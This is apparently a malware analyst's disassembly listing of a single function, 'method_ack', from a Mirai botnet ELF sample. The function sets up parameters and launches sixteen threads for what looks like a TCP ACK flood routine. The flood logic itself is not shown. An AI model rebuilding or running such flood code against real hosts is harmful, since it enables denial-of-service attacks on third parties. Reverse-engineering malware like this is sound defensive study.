
/Users/taogoldi/Projects/Malware/Mirai/input/d40cf9c95dcedf4f19e4a5f5bb744c8e98af87eb5703c850e6fda3b613668c28.elf:	file format elf64-x86-64

Disassembly of section .text:

00000000004026d0 <method_ack>:
  4026d0: 41 56                        	push	r14
  4026d2: 41 89 ce                     	mov	r14d, ecx
  4026d5: 41 55                        	push	r13
  4026d7: 41 89 d5                     	mov	r13d, edx
  4026da: ba 50 00 00 00               	mov	edx, 0x50
  4026df: 41 54                        	push	r12
  4026e1: 41 89 f4                     	mov	r12d, esi
  4026e4: 31 f6                        	xor	esi, esi
  4026e6: 55                           	push	rbp
  4026e7: 53                           	push	rbx
  4026e8: 48 89 fb                     	mov	rbx, rdi
  4026eb: 48 81 ec 50 01 00 00         	sub	rsp, 0x150
  4026f2: 48 8d ac 24 00 01 00 00      	lea	rbp, [rsp + 0x100]
  4026fa: 48 89 ef                     	mov	rdi, rbp
  4026fd: e8 1e 74 00 00               	call	0x409b20 <memset>
  402702: 48 89 de                     	mov	rsi, rbx
  402705: 48 8d 9c 24 80 00 00 00      	lea	rbx, [rsp + 0x80]
  40270d: ba 3f 00 00 00               	mov	edx, 0x3f
  402712: 48 89 ef                     	mov	rdi, rbp
  402715: e8 4a 76 00 00               	call	0x409d64 <strncpy>
  40271a: 44 89 ac 24 44 01 00 00      	mov	dword ptr [rsp + 0x144], r13d
  402722: 31 c0                        	xor	eax, eax
  402724: 4c 8d ab 80 00 00 00         	lea	r13, [rbx + 0x80]
  40272b: 44 89 a4 24 40 01 00 00      	mov	dword ptr [rsp + 0x140], r12d
  402733: 44 89 b4 24 48 01 00 00      	mov	dword ptr [rsp + 0x148], r14d
  40273b: 49 89 e4                     	mov	r12, rsp
  40273e: e8 ad fe ff ff               	call	0x4025f0 <get_local_ip>
  402743: 49 89 e6                     	mov	r14, rsp
  402746: 89 84 24 4c 01 00 00         	mov	dword ptr [rsp + 0x14c], eax
  40274d: 66 66 90                     	nop
  402750: 48 89 2b                     	mov	qword ptr [rbx], rbp
  402753: 48 89 d9                     	mov	rcx, rbx
  402756: 31 f6                        	xor	esi, esi
  402758: 4c 89 e7                     	mov	rdi, r12
  40275b: ba 60 1b 40 00               	mov	edx, 0x401b60
  402760: 48 83 c3 08                  	add	rbx, 0x8
  402764: e8 87 33 00 00               	call	0x405af0 <pthread_create>
  402769: 49 83 c4 08                  	add	r12, 0x8
  40276d: 4c 39 eb                     	cmp	rbx, r13
  402770: 75 de                        	jne	0x402750 <method_ack+0x80>
  402772: 31 db                        	xor	ebx, ebx
  402774: 49 8b 3c de                  	mov	rdi, qword ptr [r14 + 8*rbx]
  402778: 31 f6                        	xor	esi, esi
  40277a: 48 ff c3                     	inc	rbx
  40277d: e8 39 03 00 00               	call	0x402abb <pthread_join>
  402782: 48 83 fb 10                  	cmp	rbx, 0x10
  402786: 75 ec                        	jne	0x402774 <method_ack+0xa4>
  402788: bf be 50 41 00               	mov	edi, 0x4150be
  40278d: e8 ba 56 00 00               	call	0x407e4c <puts>
  402792: 48 81 c4 50 01 00 00         	add	rsp, 0x150
  402799: 5b                           	pop	rbx
  40279a: 5d                           	pop	rbp
  40279b: 41 5c                        	pop	r12
  40279d: 41 5d                        	pop	r13
  40279f: 41 5e                        	pop	r14
  4027a1: c3                           	ret
  4027a2: 66 66 66 90                  	nop
  4027a6: 66 66 66 90                  	nop
  4027aa: 66 66 90                     	nop
  4027ad: 66 66 90                     	nop
